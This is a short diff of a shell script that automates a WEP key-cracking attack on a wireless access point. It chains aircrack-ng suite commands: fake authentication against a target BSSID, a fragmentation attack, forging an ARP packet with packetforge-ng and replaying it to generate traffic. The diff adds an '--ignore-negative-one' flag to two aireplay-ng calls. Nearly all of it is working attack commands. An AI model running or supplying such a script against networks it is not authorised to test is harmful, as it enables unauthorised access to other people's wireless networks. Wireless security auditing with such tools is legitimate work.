@@ -94,10 +94,10 @@ sleep 2
 #################################################################
 # ASSOCIATE WITH AP & THEN PERFORM FRAGMENTATION ATTACK
 #################################################################
-xterm -title "Authentication process" -e "aireplay-ng -1 6000 -q 10 -e '${SSID}' -a ${BSSID} -h ${MACADDRESS} ${MON}" & AIREPLAYAUTHPID=$!
+xterm -title "Authentication process" -e "aireplay-ng -1 6000 -q 10 --ignore-negative-one -e '${SSID}' -a ${BSSID} -h ${MACADDRESS} ${MON}" & AIREPLAYAUTHPID=$!
 aireplay-ng -5 -b ${BSSID} -h ${MACADDRESS} ${MON}
 packetforge-ng -0 -a ${BSSID} -h ${MACADDRESS} -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet 
-xterm -title "ARP injection" -e "aireplay-ng -2 -r arp-packet ${MON}" & AIREPLAYPID=$!
+xterm -title "ARP injection" -e "aireplay-ng -2 --ignore-negative-one -r arp-packet ${MON}" & AIREPLAYPID=$!
 
 #################################################################
 # ATTEMPTING TO CRACK
